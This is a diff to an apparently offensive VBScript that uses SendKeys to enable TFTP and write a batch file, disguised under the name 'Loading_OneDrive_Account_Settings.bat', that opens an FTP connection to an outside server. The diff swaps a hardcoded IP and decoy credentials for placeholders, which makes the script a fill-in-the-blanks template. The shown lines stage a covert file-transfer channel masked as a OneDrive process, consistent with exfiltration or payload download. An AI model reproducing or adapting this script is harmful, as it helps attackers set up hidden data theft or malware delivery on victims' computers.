@@ -38,15 +38,15 @@ objShell.Sendkeys "DISM /online /enable-feature /featurename:TFTP"
 WScript.Sleep(500)
 objShell.Sendkeys "{ENTER}"
 WScript.Sleep(500)
-objShell.Sendkeys "echo open 172.20.10.4 >Loading_OneDrive_Account_Settings.bat"
+objShell.Sendkeys "echo open [FTP SERVER IP ADDRESS HERE] >Loading_OneDrive_Account_Settings.bat"
 WScript.Sleep(500)
 objShell.Sendkeys "{ENTER}"
 WScript.Sleep(500)
-objShell.Sendkeys "echo Microsoft_OneDrive>>Loading_OneDrive_Account_Settings.bat"
+objShell.Sendkeys "echo [FTP USERNAME HERE]>>Loading_OneDrive_Account_Settings.bat"
 WScript.Sleep(500)
 objShell.Sendkeys "{ENTER}"
 WScript.Sleep(500)
-objShell.Sendkeys "echo LOADING...>>Loading_OneDrive_Account_Settings.bat"
+objShell.Sendkeys "echo [FTP PASSWORD HERE]>>Loading_OneDrive_Account_Settings.bat"
 WScript.Sleep(500)
 objShell.Sendkeys "{ENTER}"
 WScript.Sleep(500)
